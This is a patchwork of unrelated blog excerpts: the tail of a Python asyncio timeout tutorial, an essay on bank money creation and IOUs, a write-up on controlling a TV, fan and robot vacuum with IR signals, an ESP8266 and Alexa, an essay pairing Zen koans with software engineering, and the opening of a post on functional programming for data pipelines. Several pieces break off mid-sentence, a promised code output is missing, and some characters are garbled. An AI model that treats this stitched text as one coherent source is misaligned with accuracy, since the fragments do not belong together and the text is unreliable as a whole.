It is necessary to have a timeout for waiting for the task to get completed. We are not supposed to wait forever for it to complete. <code>asyncio</code> also provided the ability to add a timeout to the async function so that you can skip the execution before its completion.</p><p>
A practical application of this can be a case when you are calling a third party API in your application and the third party itself is down. In that case, you donâ€™t want to wait for a long time.</p><p>
You can use the <code>timeout</code> method to solve your problem. See the code for example:</p>
<div><div><pre><code><span>async</span> <span>def</span> <span>async_sleep</span><span>():</span>
    <span>await</span> <span>asyncio</span><span>.</span><span>sleep</span><span>(</span><span>2</span><span>)</span>
    <span>print</span><span>(</span><span>'Execution completed'</span><span>)</span>

<span>async</span> <span>def</span> <span>main</span><span>():</span>
    <span>try</span><span>:</span>
        <span>await</span> <span>asyncio</span><span>.</span><span>wait_for</span><span>(</span><span>async_sleep</span><span>(),</span> <span>timeout</span><span>=</span><span>1.0</span><span>)</span>
    <span>except</span> <span>asyncio</span><span>.</span><span>TimeoutError</span><span>:</span>
        <span>print</span><span>(</span><span>'Timeout error'</span><span>)</span>

<span>asyncio</span><span>.</span><span>run</span><span>(</span><span>main</span><span>())</span>
</code></pre></div></div><p>
The async function will raise <code>TimeoutError</code> if the coroutine doesnâ€™t return before the given <code>timeout</code> is passed.</p><p>
Response after executing the above code is</p>
<p>
There are other awesome methods in the <code>asyncio</code> module.</p><p>
You can check them at <a href="https://docs.python.org/3/library/asyncio-task.html">pythonâ€™s official website</a>.</p>
<h2 id="conclusion">Conclusion</h2><p>
If you want to provide a better and faster experience to your users, you can start using the <code>asyncio</code> module in your application. This will definitely help you find cases in which you can reduce the execution time of your API or whatever else that you are doing.</p><p>
Just forcing yourself to write in this way for a few months can yield big returns in the future.</p>

<p>Most people are familiar with central banks’ ability to create money out of thin air. A central bank has access to physical printing presses which can produce physical banknotes, and it has the corresponding ability to create electronic money. However, central banks are not the only entities which create money. Money is also created by regular banks, such as retail banks and commercial banks, in the process of making loans.</p>
<p>Many people believe that regular banks’ ability to create money is similar to central banks’ ability to create money. It is not. This misconception has been perpetuated by a powerful cast of characters which includes <a href="https://www.hs.fi/tiede/art-2000002869261.html" target="_blank">mainstream news outlets</a> and even <a href="https://www.sciencedirect.com/science/article/pii/S1057521914001070" target="_blank">some economists</a>.</p>
<p>This article will demystify money creation by illustrating the following facts:</p>
<ul>
<li>A bank deposit is merely an IOU.</li>
<li>A bank loan is merely an exchange of 2 IOUs.</li>
<li>Anyone can create IOUs out of thin air.</li>
<li>When a customer redeems an IOU at a bank, the bank typically needs to hand over another form of money — the kind that it cannot create out of thin air.</li>
</ul>
<p><strong>Bank deposits are merely IOUs</strong></p>
<p>Suppose you have $100 in cash. You decide to deposit it at your local bank. Now you no longer have $100 in cash. Instead, you have a <em>promise</em> from the bank that you can withdraw $100 in cash at any time. The bank has $100 in cash and you have a promise. Let’s imagine this promise as a physical document acknowledging debt, an IOU (”I owe you”). The bank owes you $100 and promises that you can exchange this IOU to $100 cash at any time.</p>

<p>Is this IOU ”money”? We’ll get to that later, but the short answer is yes, that IOU is money. There are different types of money, and checking account deposits are usually considered to be a type of money.</p>
<p>Let’s illustrate this bank deposit as an exchange:</p>

<p>Assets are things the bank <em>owns</em>, liabilities are things the bank <em>owes</em>. In this simplified example, the only asset that the bank has is the $100 in cash that you deposited — now considered to be the <em>bank’s</em> asset — and the only liability is the $100 debt that the bank owes to you. These accounting entries were created at the same time: when the bank incremented your checking account by $100 (the deposit liability in bank’s accounting), there was a corresponding $100 cash deposit (the cash asset in bank’s accounting).</p>
<p><strong>A bank loan is merely an exchange of 2 IOUs</strong></p>
<p>Let’s continue with the example where you deposited $100 to a bank. Suppose I will go into that bank and ask for a $10 loan. Now that the bank owns $100, it can easily afford to loan me $10. I promise to pay back $11 at a later point in time, so the bank is eager to offer me a loan and make that dollar.</p>
<p>The bank deposits this $10 loan to my checking account. Remember, checking account deposits are IOUs, so the bank just gave me a $10 IOU. I promised to pay back $11, so I also created an IOU. In other words, this loan is an exchange of 2 IOUs: the bank promises to give me $10 in cash whenever I want, and I promise to give the bank $11 at a later point in time. Let’s imagine these IOUs as physical documents:</p>

<p>The bank still has that $100 cash in assets, and it still has that $100 liability to John. But now the bank also has a $10 liability to me: I could withdraw my $10 from the bank in cash at any time. Corresponding to this liability, the bank has recorded a new asset: my promise to pay back $11 later.</p>
<p>Notice how the bank now has $110 of deposits, but only $100 of cash in the vault. Welcome to fractional reserve banking! If I decided to withdraw my $10 from the bank today, and you decided to withdraw your $100 from the bank tomorrow, the bank would say ”oops, we no longer have your money”. In practice this rarely happens due to a myriad of reasons (banks can trade assets between each other when they have too little/too much cash, banks have internal risk controls which limit lending and other risky endeavours, lawmakers impose restrictions which are monitored by regulators, the existence of deposit insurance reduces likelihood of bank runs, etc.).</p>
<p>Anyway, let’s get to the interesting bit. Before taking out the loan there was $100 on checking account balances and afterwards there was $110 on checking account balances. Clearly, money was created in the process of taking out the loan. Where did this money come from? Was it created out of thin air? The short answer is yes, kind of, but let’s step back a little bit.</p>
<p><strong>What is money, anyway?</strong></p>
<p>Let’s go back to the cash deposit example. You deposit $100 into a bank and the bank records it as an asset. The bank records a corresponding liability: a $100 deposit to your checking account. Did the bank create money in this scenario?</p>
<p>Before the deposit there was $100 of cash money, but after the deposit there was $100 of cash money + $100 of electronic money = $200 worth of money in total. But of course we don’t want to ”double count” your money just because you deposited it in a bank, right? That’s why economists developed this convention that cash money in a bank’s vault is considered to be ”out of circulation”, and thus, is not typically counted when we count how much money exists.</p>

<p>The Eurozone M1 definition for money is <a href="https://www.ecb.europa.eu/stats/money_credit_banking/monetary_aggregates/html/hist_content.en.html" target="_blank">basically</a> equal to this notion of ”currency in circulation”. The concept of money is ambiguous, so there are many different definitions, varying by both economic area and by use case. Nevertheless, checking account balances are included in most commonly used definitions (though not in all, for instance the UK M0 definition for money <a href="https://www.bankofengland.co.uk/statistics/details/further-details-about-m0-data" target="_blank">does not</a> include checking account balances).</p>
<p>In abstract terms we might think that the $100 cash you deposited into a bank was transformed into a $100 checking account balance. Except it wasn’t. That $100 of cash money still exists. It was not transformed into anything. The bank took $100 of cash and put it in a vault. Then the bank created an IOU out of thin air and gave it to you. (We can say that the IOU was created out of thin air, because the corresponding $100 cash in the vault is not earmarked to this IOU — the bank may run out of cash before you try to redeem that IOU.) Then economists decided that the IOU counts as money, and the cash in the vault does not count as money. Thus, the act of depositing cash in a bank does not result in (net) creation of money. $100 of electronic money is added to circulation while $100 of cash money is removed from circulation, for a net difference of $0.</p>
<p>When you deposit cash in a bank, the bank creates an IOU out of thin air. Similarly, when you take a loan out of a bank, the bank creates an IOU out of thin air. However, due to accounting conventions, the latter action results in net money creation, while the former action does not. (Although these conventions are weird, they make sense: currency in circulation is a good measure with real implications for economic activity, and currency in circulation is genuinely increased when banks loan money.)</p>
<p><strong>Anyone can create IOUs out of thin air</strong></p>
<p>If there’s only one thing you take away from this article, let it be this. IOUs are promises. Anyone can make promises out of thin air. For example, I could be handing out IOUs like this, furbished with my signature for authenticity:</p>

<p>You might think these would be worthless, but that’s not exactly the case. People who know me would think ”Atte is good for $10”. These would not be worth exactly $10, because you would still rather take $10 in cash than a coupon that’s exchangeable for $10 in cash. And it’s unlikely that these IOUs would be used to facilitate real economic activity, so these IOUs should not be considered ”money”. Although there are clear differences in how these IOUs <em>would be used</em>, compared to the IOUs created by banks, is there any <em>fundamental</em> difference between the IOUs themselves?</p>
<p>Let’s take another example and get one step closer to creating money. This one is real, not hypothetical, example of IOUs created by a non-bank corporation.</p>
<p>We have to go all the way back to 2011. Poker is booming and Full Tilt Poker is one of 2 giants dominating the scene (the other being PokerStars). The way that poker sites work is you deposit money (like you would in a bank) and then as you play poker and you win and lose money from other players, the poker site keeps track of how much money everyone has (like a bank would keep track of transfers between customers of the same bank).</p>
<p>In other words, a poker site issues IOUs to players. These IOUs are supposedly redeemable at any time (like the IOUs created by a bank). The IOUs created by Full Tilt Poker were largely treated as money by players of the site, to the point where they were used to facilitate real economic activity. For example, it was typical for players to settle small debts (like $10 for a movie ticket) by sending a player-to-player transfer on Full Tilt Poker instead of sending a bank transfer (because transfers on poker sites were typically faster and easier to make than bank transfers).</p>

<p>For all intents and purposes, the IOUs created by Full Tilt Poker were money. They simply were not counted as money due to accounting conventions. Now, some of you might be thinking <em>”Wait a minute… Doesn’t the poker site have all player funds in the bank? If all player funds have corresponding bank deposits, then those bank deposits would already be counted as money, and we wouldn’t want to double count that money.”</em> Yeah, I also thought that Full Tilt Poker had player funds in the bank (can you guess where this is going?).</p>
<p>On April 15, 2011, known in the poker world as <a href="https://en.wikipedia.org/wiki/United_States_v._Scheinberg" target="_blank">Black Friday</a>, the FBI raided offices of Full Tilt Poker and PokerStars as part of a larger crackdown on online gambling. This law enforcement action triggered an instant bank run by players: everyone …</p></div></div></div>

<p>With the increased amount of time I’ve spent in my apartment over the last few months and my new found electronics hobby, I thought it’d be fun to try and automate my studio apartment.&nbsp;</p>



<p>Here’s a picture of the apartment (above) in all of it’s 450 square foot glory. </p>



<p>I spend most of my time in the area with my desk, bed, sofa, and television. So, it made sense to focus on making this area as comfortable and usable as possible.&nbsp;</p>



<p>Take note of the robotic vacuum cleaner, the standing fan, and the television. I use these devices daily, but more importantly, they all respond to IR signals.</p>



<p>Consequently, I knew if I could decode the signal their IR remotes were sending, I’d be able to create a circuit that could broadcast an identical signal thereby controlling the device. Additionally, with an Amazon Alexa integration, I’d conceivably be able to make all of these devices voice-controlled.&nbsp;</p>



<h2>Demo</h2>



<p>Here’s a brief demo of the finished project. If you’re interested in seeing the circuit, code, and other implementation details, read on! Not only can I control my TV through Alexa, but also my standing fan and my robot vacuum cleaner. </p>



<figure><p>

<p>Here’s a demo of the fan. Triggering the sleep timer command cycles through the different delay options until the 1, 2, and 4 hour options are all enabled. </p>

</p></figure>



<p>Finally, here’s a demo of the robot cleaner returning to the home station when the “dock” command is triggered. </p>



<figure><p>

</p></figure>



<h2>Implementation</h2>



<p>The first step was identifying the correct IR codes to send which was by far the most involved part of this project. I had seen some other examples online of people trying to reverse engineer the IR codes their remote controls were sending and they were getting back a single clear value.&nbsp;</p>



<p>Unfortunately, I wasn’t so lucky. Any remote control key I pressed would give me a slew of possible signal codes – not just one discrete value. </p>



<p>So, in order to find the correct one, I’d press the button I was trying to decode a few times to build up a potential list of valid IR signals. Then, I’d programmatically loop through them slowly to try and identify which IR signal was actually triggering the device. </p>



<blockquote><p>Figuring out what IR encoding the signals were using was another time and research-intensive task.&nbsp;</p></blockquote>



<p>Here’s the schematic for the IR receiver:&nbsp;</p>



<figure><img src="https://lh3.googleusercontent.com/9aIHnUoDInPSudNujmBCmDYByZtYpPrH8BlIoplioo65dvTrtOjfLCUuR3TtyPTuCDumUsERv2tS1FzRuXFZjUmZgkSg8sF2G2Sp0Mh9wuFjmTXxU3RdjseWvq0N9dgRimRriktr" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>The final circuit is rather simple – an ESP8266 (for WiFi capabilities), a PN2222 transistor, and two IR LEDs. You certainly don’t need 2 IR LEDs, but I wanted greater coverage in the apartment and I had some parts to spare. </p>



<p>You can easily find the parts on Amazon and they’re all just soldered to a spare piece of perfboard.</p>



<p><img src="https://lh5.googleusercontent.com/JyV0pAaK6x43Sfc4dHxRnqnMbKefIvrq3aYbgWemNlb22-Bc6VTeGZM-2RPrdC5DaH6xXPZEan9rVfp-V07plvFNwAiNoBELJK1SzJ2k0T7rxlg5dHMmCPN7r3NQhxNmpvs9HeLA" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>



<p>Though it’s hard to tell in the photo, the two IR LEDs are angled slightly away from one another to increase coverage of the apartment. </p>

<blockquote><p>A few tips if you’re trying to replicate this yourself. </p><p>For a while, I was getting a lot of noise or absolutely no IR values back at all from the IR receiver. I realized that the ambient light was interfering with the IR receiver. So, the simplest solution was just to hide the circuit and the remote control under a blanket while trying to record IR signals to eliminate any noise from ambient light.&nbsp;</p></blockquote>



<p>Make sure to replace the placeholders in the following code. This code is meant for an ESP8266, but should also be compatible with an ESP32. &nbsp;There’s certainly cleaner ways of writing this code, but my focus was on creating a proof of concept. </p>







<blockquote><p>For the “clean up” and “dock” commands, I repeat the signal at regular intervals in the hopes that the robot vacuum cleaner is in the line of sight of the circuit at one of those time intervals. Unlike all of the other devices, the location of the robot isn’t static.</p></blockquote>



<p>Now, I had a circuit that was capable of controlling the main devices in my apartment. The next step was the Alexa integration. </p>



<h2>Alexa Integration</h2>



<p>The first issue I ran into was how to establish a connection between the Alexa and the ESP8266. Both were on the same local network, but I couldn’t find a way of setting up Alexa to make a local web request. Initially, it seemed like configuring port forwarding on my router was the only option and I wasn’t too keen on doing that. </p>



<p>Eventually, after a bit more research, I realized that Alexa could talk to <a href="https://ifttt.com/" target="_blank" rel="noreferrer noopener">IFTTT</a> and that IFTTT had an <a href="http://adafruit.com/" target="_blank" rel="noreferrer noopener">Adafruit</a> integration. This meant I could use the <a href="https://en.wikipedia.org/wiki/MQTT" target="_blank" rel="noreferrer noopener">MQTT</a> protocol to pass commands from Alexa to my circuit through Adafruit.&nbsp;</p>



<blockquote><p>The MQTT protocol, in essence, is a publisher/subscriber model often used by IoT devices. In this use case, Alexa would publish different messages (turn on tv, turn on fan, clean up) and the circuit would subscribe to Alexa’s broadcast and trigger the correct IR signal.</p></blockquote>



<h2>Tutorial</h2>



<p>If you’re interested in replicating this same flow, start off by <a href="http://io.adafruit.com/" target="_blank" rel="noreferrer noopener nofollow">creating a free Adafruit account.</a></p>



<p>Once you’re logged in, go to Feeds and create a new Feed. In my case, I titled it <code>smartStudio</code>.  This Feed will be a running list of all messages sent to this topic over the MQTT protocol. As you can see, a log of all the voice commands I’ve used in the last month appear in this Feed.</p>

<p>Click on <code>This</code> and select Amazon Alexa. Then, select the Alexa “say a specific phrase” integration.</p>



<blockquote><p>You’ll be asked to complete a small authorization flow if this is the first time you’re integrating these services.</p></blockquote>



<p>Now, whenever we say the phrase we define here, Alexa will trigger the “that” portion of your IFTTT integration.</p>

<p>Now, we can send a message to our Adafruit Feed with a custom payload, in this case <code>hbo</code>. All that’s remaining is to handle this case in the code and fire off the right IR signal.</p>



<p>Once you’ve created a few more triggers, your IFTTT dashboard should look something like this: </p>

<h2>Troubleshooting</h2>



<p>Because the MQTT framework doesn’t guarantee delivery of a message, sometimes I would give Alexa a command, but the ESP8266 chip would never receive it. </p>



<p>It’s a fairly rare occurrence and since Adafruit doesn’t allow me to customize the quality of service settings for the MQTT implementation, there’s no immediate solution to this problem.&nbsp;</p>







<h2>Some finishing touches</h2>



<p>Now, we’re on the home stretch. We’re able to issue a command to Alexa, which gets forwarded to IFTTT, then to Adafruit, and finally to my circuit which sends out the correct IR signal.&nbsp;</p>



<p>The final issue, however, was that even though saying “Alexa, trigger clean up” and having my robot vacuum cleaner spin up was pretty cool, I really disliked the sound of the robot bumping into everything as it cleaned. The noise is very noticeable in such a small apartment. </p>



<p>Eventually, I stumbled upon the “Routines” feature in the Amazon Alexa iOS app which allowed me to set up a few location-based triggers. </p>



<p>So, whenever I left my apartment, Alexa would trigger the “clean up” command. The robot would start up, and then 15 minutes later, Alexa would trigger the “dock” routine.&nbsp;</p>

<p>Now, my apartment would consistently stay clean and I wouldn’t have to hear the robot bumping around everywhere. Additionally,&nbsp; I added another routine that monitored my location to detect when I was heading back to my apartment and would preempt the cleaning with a “dock” command.&nbsp;</p>



<p>Solving first world problems, I know.&nbsp;</p>



<p>For a more useable experience, I’d also recommend enabling “follow up” mode (allows you to issue multiple commands at once) and “brief responses” on Alexa.</p>

<p>Now that I’ve had this installed for a couple months, I wanted to see how often I actually used it. After pulling the logs from Adafruit, I’ve used this over 800 times in this month alone [August 2020], an average of almost 30 times a day.</p>

    <h2>Good Software Engineers Are Rare</h2>
<p>Good software engineers are rare. There are many reasons as to why. The most obvious reason is that to become a good software developer one has to master many skills (language proficiency, documentation literacy, debugging, text editing, architecture, and design, etc, etc). Because these are the obvious barriers to becoming good, there is an abundance of advice out there for young engineers on how to hone their skills. Most of this advice is either uninteresting, inefficient, or both. Why? Because the process of mastering a skill is typically independent of the skill being mastered. The process is almost always as simple as: learn (read technical material), practice (daily), have patience.</p>
<p>Unfortunately, mastering the skills is not enough to become a good engineer. If it were, the good software engineer would be no rarer than the hardworking, motivated engineer. Having the essential hard/technical skills mastered is only the start. To become great, the software engineer must adopt a mindset that often operates in opposition to the philosophical structure of the western world.</p>
<h2>Software Products Are Unique</h2>
<p>My development as an engineer began outside of the software world. I studied electrical engineering where I spent countless hours of my life in the lab: designing circuits, prototyping on breadboards, acid bathing PCBs. All of these efforts led to a finished, permanent product. Whether it be a power supply I could plug my computer into, a multimeter, an antenna, or some mostly useless gadget, I always had something I could hold in my hands that gave me a sense of pride and satisfaction. Productive societal activity tends to operate similarly. There is the expectation of tangible end results, and the success of an activity or task is contingent on the end result. For example, there are few companies or teams that do not set KRs (key results) each quarter, half, year. Developing software products, peskily enough, is decidedly unlike this. A software product is ephemeral. It can't be held or touched. There is no definitive "end result" or "finished product". What's more, the work done is impermanent. These traits aren't just unique, they clash with many fundamental expectations about the way we believe work/productive activity should behave. Whether consciously or subconsciously all good software engineers have had to internalize some sort of framework to allow themselves to reckon with this cognitive dissonance.</p>
<h2>Look To The East</h2>
<p>So what must a software engineer do if they can't rely on societal norms of the west to help them build the skills, temperance, and mindset to become competent, productive, and successful? They must <a href="https://www.theculturium.com/hermann-hesse-the-journey-to-the-east/">look to the east</a>. The western concepts that the software engineer must cast aside are:</p>
<pre><code> attachment
 permanence
 duality
 reason
</code></pre>

<p>The philosophy of Zen Buddhism rejects these cornerstones of western life. So it is in the delightful riddles/stories that the Zen Buddhists call <a href="http://www.ashidakim.com/zenkoans/zenindex.html">Koans</a> that we might look for answers. The following are three of my favourite Koans that have been helpful on my path to becoming that rare and golden, madly productive, madly exact engineer.</p>
<h2>Non-Attachment</h2>
<pre><code>"Kitano Gempo, Abbot of Eihei temple, was ninety-two years old when he passed away in the year 1933. He endeavored his whole life not to be attached to anything. As a wandering mendicant when he was twenty he happened to meet a traveler who smoked tobacco. As they walked together down a mountain road, they stopped under a tree to rest. The traveler offered Kitano a smoke, which he accepted, as he was very hungry at the time.

"How pleasant this smoking is," he commented. The other gave him an extra pipe and tobacco and they parted.

Kitano felt: "Such pleasant things may disturb meditation. Before this goes too far, I will stop now." So he threw the smoking outfit away.

When he was twenty-three years old he studied I-King, the most profound doctrine of the universe. It was winter at the time and he needed some heavy clothes. He wrote his teacher, who lived a hundred miles away, telling him of his need, and gave the letter to a traveler to deliver. Almost the whole winter passed and neither answer nor clothes arrived. So Kitano resorted to the prescience of I-King, which also teaches the art of divination, to determine whether or not his letter had miscarried. He found that this had been the case. A letter afterward from his teacher made no mention of clothes.

"If I perform such accurate determinative work with I-King, I may neglect my meditation," felt Kitano. So he gave up this marvelous teaching and never resorted to its powers again.

When he was twenty-eight he studied Chinese calligraphy and poetry. He grew so skillful in these arts that his teacher praised him. Kitano mused: "If I don't stop now, I'll be a poet, not a Zen teacher." So he never wrote another poem. "
</code></pre>

<p>In this koan, Kitano displays an ability that every software engineer should find enviable: a relentless non-attachment to all things outside of the pursuit of Zen. A software project is in constant flux. So is the state of tools, technology, and frameworks in the field. There is a serious lack of permanence in software development, and the best way to cope with that impermanence is to become a solid practitioner of non-attachment.</p>
<p>The inability for ICs to remain unattached to particular pieces of work completed, or particular technologies is probably one of the most common and detrimental problems software development teams encounter. Features that have had blood, sweat, and tears poured into them but do not serve a purpose fail to get removed, technologies invested in that end up being duds do not get replaced. All of this results in projects and companies suffering major setbacks. Ben Horowitz frames the problem well in his book <a href="https://www.goodreads.com/book/show/18176747-the-hard-thing-about-hard-things">The Hard Things about Hard Things</a>: "Early in my career as an engineer, I'd learned that all decisions were objective until the first line of code is written. After that, all decisions were emotional." The less attached a team of engineers is to their own work, the less emotional the decisions about a project will be. Good engineers are happy to delete their own code. A leaner code base is an easier codebase to work in. Good engineers are excited when a teammate finds a more robust, easier-to-work-with solution to the problem they have been working on. They don't create inertia and waste time by resisting switching to that solution, no matter how much work they have sunk into their own implementation. Good engineers are like Kitano.</p>
<h2>It Will Pass</h2>
<pre><code>A student went to his meditation teacher and said, "My meditation is horrible! I feel so distracted, or my legs ache, or I'm constantly falling asleep. It's just horrible!"

"It will pass," the teacher said matter-of-factly.

A week later, the student came back to his teacher. "My meditation is wonderful! I feel so aware, so peaceful, so alive! It's just wonderful!'

"It will pass," the teacher replied matter-of-factly.
</code></pre>

<p>Mmm, such a beautiful dialogue. Reading it quells the destructive flames of pride and ego that flare-up in my stomach whenever I am on a productive kick. Many engineers thrive off of the energy of this fire, but it can be dangerous if untempered. Engineers, it has been said, are natural optimists. Engineers are also, I will posit, naturally prideful. When they are assigned a project or ticket and are asked to estimate how long it will take, they almost certainly will imagine themselves at their most productive when making the estimate. This results in the unenlightened engineer wreaking no small havoc on the logistics of managing a project. No engineer is at their most productive at all times; the productive fervor of a great session is fickle. The engineers who assess their own skills and compare themselves to their colleagues as if they are, hurt themselves and their team. They stunt their growth (by believing they are already outperforming all their colleagues), are hard to manage, and are hard to work with.</p>
<p>Recently, while working on extending our application's backend to be accessible via a GraphQL API, I came across a few blogposts by an engineer named Marc-Andre Giroux. Clearly, a quite talented engineer, I noticed a neat little feature on his <a href="http://mgiroux.me/">site's homepage</a>. As a play on the 10x engineer motif, he describes himself as an "Nx platform interface engineer", the N flitting randomly between decimal numbers from 0 to 10. Marc-Andre is clearly a talented engineer, yet is zen enough to appreciate that he is not always in the state of ultra-productive. Admittedly, sometimes he is even less than 1x engineer. He understands "It will pass" and is most likely a factor in his success.</p>
<p>Avoiding overestimation of yourself is not the only lesson to be learned. This koan helps me to avoid taking productive times for granted. Understanding that quieter seas and lulls in productivity and focus may be just around the corner is good motivation to keep pushing for more while you are in the zone. Zen has taught me to never let a good session go to waste.</p>
<p>Finally, this koan helps me during the unproductive and unfocused times as well. I often experience a quite intense physical aching and pain during those hours where I can't seem to get any code written, or worse when I can only seem to produce poor, convoluted, messy solutions. Knowing that such a state is somewhat inevitable and that It Will Pass, is a medicative and constructive mindset to have.</p>
<h2>First There is a Mountain</h2>
<pre><code>At the first level on the path, he saw mountains as mountains and rivers as rivers.

On the second level of the path, he saw that mountains are not mountains and rivers are not rivers.

And at a third level, he saw once again mountains were mountains and rivers were rivers.

<p>This koan is a description of the Zen student <a href="https://plato.stanford.edu/entries/japanese-zen/#OveDua">overcoming dualism</a>. In Zen, the idea is called "Not Two". The student first sees the river as discrete from the mountains. The student then sees that …</p></div></div>

	<p>During my years as a software engineer, I got exposed to more and more
data-based projects where data engineering and model research were
major aspects of the system.</p>

<p>Over time, one main pattern became apparent: the functional programming
paradigm helps a lot when working with data-oriented systems.</p>

<p>For a regular data scientist or a data engineer, they will be quite familiar
with ETL (Extract, Transform, Load) pipelines. However, not all data scientists
and data engineers are familiar with functional programming and its
benefits.</p>



<p>I’ll remind again, that according to Uncle Bob, 
the essence of functional programming is that</p>

<blockquote>
  <p>Variables in functional languages do not vary</p>
</blockquote>

<p>and</p>

<blockquote>
  <p>Functional programming is disciple imposed upon variable assignment.</p>
</blockquote>

<p>Or, according to <a href="https://en.wikipedia.org/wiki/Functional_programming">Wikipedia</a>:</p>

<blockquote>
  <p>In computer science, functional programming is a programming paradigm where programs are constructed by applying and composing functions. It is a declarative programming paradigm in which function definitions are trees of expressions that each return a value, rather than a sequence of imperative statements that change the state of the program.</p>
</blockquote>

<p>In other words, you can assign variables a new value, but existing values cannot change.</p>

<p>A few examples:</p>
<div><div><pre><code><span># BAD
</span><span>my_var</span> <span>=</span> <span>{</span><span>'c'</span><span>:</span> <span>'value'</span><span>}</span>
<span>my_var</span><span>[</span><span>'b'</span><span>]</span> <span>=</span> <span>'new_value'</span>
<span># or 
</span><span>my_var</span><span>[</span><span>'c'</span><span>]</span> <span>=</span> <span>'new_value'</span>

<span># GOOD
</span>
<span>my_var</span> <span>=</span> <span>{</span><span>'c'</span><span>:</span> <span>'value'</span><span>}</span>
<span>my_var</span> <span>=</span> <span>dict</span><span>(</span><span>**</span><span>my_var</span><span>,</span> <span>b</span><span>=</span><span>'new_value'</span><span>)</span>

<span># or
</span><span>my_var</span> <span>=</span> <span>{</span><span>'c'</span><span>:</span> <span>'new_value'</span><span>}</span>

</code></pre></div></div>

<p>using functions</p>
<div><div><pre><code><span># BAD
</span><span>def</span> <span>my_function</span><span>(</span><span>input_dict</span><span>):</span>
    <span>input_dict</span><span>[</span><span>'new_value'</span><span>]</span> <span>=</span> <span>'var'</span>
    <span>return</span> <span>True</span>

<span># GOOD
</span><span>def</span> <span>my_function</span><span>(</span><span>input_dict</span><span>):</span>
    <span>return</span> <span>dict</span><span>(</span><span>**</span><span>input_dict</span><span>,</span> <span>new_value</span><span>=</span><span>'var'</span><span>)</span>    

</code></pre></div></div>

<p>This has a few important implications:</p>
<ul>
  <li>if you receive value, you can be sure that it won’t change mid-processing because it was modified
 in another thread</li>
  <li>as a function caller, you can be sure that after calling the function passed in arguments
 haven’t changed and you can use them the same way before calling the function</li>
  <li>as a function writer, you can do whatever you want with the data, as long as you do not change
 the original value and return results in the new one</li>
</ul>

<p>As you can see, it reduces surprises and eases the cognitional context load of the programmer as
we do not  need to worry about the state of the entire program but just the 
local state (input)
of the function.</p>

<p>There is a common expectation that if you call the function with the same arguments, it will
return the same results. However, that is not always the case:</p>
<ul>
  <li>reading the same file, with the same filename, might produce a different result if the file was updated</li>
  <li>calling function that returns current time should return different time during each call</li>
  <li>etc</li>
</ul>

<p>These edge cases usually creep in from the environment (boundaries with the environment) and a keen
functional practitioner could work around these by introducing Environment or Context
states but for practical purposes it is more work than it is worth.</p>

<p>The implications above often lead to code structure that looks like this:</p>

<div><div><pre><code>
<span>x1</span> <span>=</span> <span>my_function_one</span><span>(</span><span>input</span><span>)</span>
<span>x2</span> <span>=</span> <span>another_call</span><span>(</span><span>x1</span><span>)</span>
<span>b3</span> <span>=</span> <span>third_call</span><span>(</span><span>x1</span><span>,</span> <span>x2</span><span>)</span>
<span>final_result</span> <span>=</span> <span>calculate</span><span>(</span><span>b3</span><span>)</span>
</code></pre></div></div>

<p>It’s easier to reason about the calls step-by-step as the context of each function call is
always limited.</p>

<p>As it usually happens, in data engineering data processing flows are often quite simple, and
the pipeline above looks like:</p>

<div><div><pre><code><span>x</span> <span>=</span> <span>my_function_one</span><span>(</span><span>input</span><span>)</span>
<span>x</span> <span>=</span> <span>another_call</span><span>(</span><span>x</span><span>)</span>
<span>x</span> <span>=</span> <span>third_call</span><span>(</span><span>x</span><span>)</span>
<span>final_result</span> <span>=</span> <span>calculate</span><span>(</span><span>x</span><span>)</span>
</code></pre></div></div>

<h2 id="coupling">Coupling</h2>
<p>One missing, but quite important, piece of this puzzle is that the functions should be cohesive (
one responsibility) and loosely coupled. What does it mean to be loosely coupled?</p>

<p>Let’s compare these two examples:</p>

<div><div><pre><code><span>def</span> <span>my_function_one</span><span>(</span><span>b</span><span>):</span>
    <span>#...
</span>    <span>return</span> <span>c</span>

<span>def</span> <span>another_call</span><span>(</span><span>b</span><span>):</span>
    <span>#...
</span>    <span>c</span> <span>=</span> <span>my_function_one</span><span>(</span><span>c</span><span>)</span>
    <span>return</span> <span>c</span>

<span>def</span> <span>third_call</span><span>(</span><span>b</span><span>):</span>
    <span>#...
</span>    <span>c</span> <span>=</span> <span>another_call</span><span>(</span><span>c</span><span>)</span>
    <span>return</span> <span>c</span>

<span>def</span> <span>calculate</span><span>(</span><span>b</span><span>):</span>
    <span>#...
</span>    <span>c</span> <span>=</span> <span>third_call</span><span>(</span><span>c</span><span>)</span>
    <span>return</span> <span>c</span>

<span>final_result</span> <span>=</span> <span>calculate</span><span>(</span><span>x</span><span>)</span>

</code></pre></div></div>

<p>and</p>

<div><div><pre><code><span>def</span> <span>my_function_one</span><span>(</span><span>b</span><span>):</span>
    <span>#...
</span>    <span>return</span> <span>c</span>

<span>def</span> <span>another_call</span><span>(</span><span>b</span><span>):</span>
    <span>#...
</span>    <span>return</span> <span>c</span>

<span>def</span> <span>third_call</span><span>(</span><span>b</span><span>):</span>
    <span>#...
</span>    <span>return</span> <span>c</span>

<span>def</span> <span>calculate</span><span>(</span><span>b</span><span>):</span>
    <span>#...
</span>    <span>return</span> <span>c</span>

<span>x</span> <span>=</span> <span>my_function_one</span><span>(</span><span>input</span><span>)</span>
<span>x</span> <span>=</span> <span>another_call</span><span>(</span><span>x</span><span>)</span>
<span>x</span> <span>=</span> <span>third_call</span><span>(</span><span>x</span><span>)</span>
<span>final_result</span> <span>=</span> <span>calculate</span><span>(</span><span>x</span><span>)</span>
</code></pre></div></div>

<p>What will happen, if <em>we</em> do not need to call <code>another_call</code>? In the first case, we could remove it
from the <code>third_call</code> function, but that would break functionality for all the other
users of <code>third_call</code> function.</p>

<p>Clearly, the latter case is more loosely coupled, because we can just drop the <code>x = another_call(x)</code>
line, we will achieve our goals, and the code won’t be broken for the other users.</p>

<p>The other nice thing is that nested function calls build this mental complexity hierarchy that
becomes harder to follow with each function. You can’t really understand what each function does
without traversing the hierarchy up and investigating all the other calls.</p>



<p>Now, we now know how to write nice “functional” functions. What can we do with that?</p>

<p>In the examples above we had a pipeline that processed just a single value. In most of the cases,
we operate on the lists. Those lists can be anything:</p>
<ul>
  <li>lists of lists</li>
  <li>lists of byte arrays</li>
  <li>lists of tuples that are made of other objects and other lists</li>
  <li>etc</li>
</ul>

<p>but we usually get some kind of list first. In Python, it means a specific type of array-like collection
but in reality, we just need some kind of Iterable.</p>

<h2 id="enter-the-map">Enter the map</h2>

